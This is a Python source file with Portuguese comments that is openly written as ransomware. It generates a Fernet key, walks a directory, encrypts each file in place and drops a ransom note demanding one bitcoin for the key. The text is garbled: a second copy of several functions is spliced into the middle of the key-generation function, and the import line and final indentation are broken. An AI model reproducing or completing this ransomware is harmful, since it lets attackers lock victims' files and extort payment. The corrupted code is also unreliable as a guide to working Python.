from cryptography.fernet import Fernetort 
import os    

# 1. gerar uma chave de criptografia e salvar

def gerar_chave():
    chave =     from cryptography.fernet import Fernet
    import os
    
    # 1. gerar uma chave de criptografia e salvar
    def gerar_chave():
        chave = Fernet.generate_key()
        with open("chave.key", "wb") as chave_file:
            chave_file.write(chave)
    
    # 2. carregar a chave salva
    def carregar_chave():
        return open("chave.key", "rb").read()
    
    # 3. criptografar um unico arquivo
    def criptografar_arquivo(arquivo, chave):
        f = Fernet(chave)
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_encriptados)
    
    # 4. encontrar arquivos para criptografar
    def encontrar_arquivos(diretorio):
        lista = []
        for raiz, _, arquivos in os.walk(diretorio):
            for nome in arquivos:
                caminho = os.path.join(raiz, nome)
                if nome != "ransoware.py" and not nome.endswith(".key"):
                    lista.append(caminho)
        return listaFernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        
# 4. encontrar aquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

# 5. Mensamgem de resgate
def criar_mensagem_resgate():
    with open("LEIA isso.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("envie 1 bitcoin para o endereço X e envie o comprovante!\n.")
        file.write("Depois disso, enviaremos a chave para voce recuperar seus dados!\n")
        
  # 6. execucao principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos_para_criptografar = encontrar_arquivos("teste_files.")
    for arquivo in arquivos_para_criptografar:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()      
    print("Ransoware execuatdo! arquivos oram criptografados!")
  
  if __name__ == "__main__":
      main()  
